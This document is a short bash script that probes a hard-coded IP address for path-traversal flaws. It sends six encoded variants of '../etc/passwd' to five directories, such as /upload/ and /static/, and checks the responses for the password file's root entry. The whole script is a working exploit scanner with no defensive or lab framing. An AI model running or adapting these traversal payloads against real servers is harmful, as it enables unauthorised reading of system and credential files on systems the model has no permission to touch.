#!/bin/bash
H=http://144.123.22.234:9080
vars=(
'../../../../etc/passwd'
'..%2f..%2f..%2f..%2fetc/passwd'
'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
'%252e%252e%252f%252e%252e%252fetc/passwd'
'....//....//....//etc/passwd'
'..;/..;/..;/etc/passwd'
)
dirs=(/html/ /assets/ /profile/ /upload/ /static/)
for d in "${dirs[@]}"; do
  for v in "${vars[@]}"; do
    u="$H$d$v"
    out=$(curl -s --path-as-is --max-time 8 -D - "$u")
    code=$(printf '%s' "$out" | head -1 | tr -d '\r')
    ct=$(printf '%s' "$out" | grep -i '^content-type' | tr -d '\r')
    cl=$(printf '%s' "$out" | grep -i '^content-length' | tr -d '\r')
    echo "== $d | $v"
    echo "   $code | $ct | $cl"
    printf '%s' "$out" | grep -c 'root:x:0:0' | sed 's/^/   passwdhit=/'
    sleep 1
  done
done
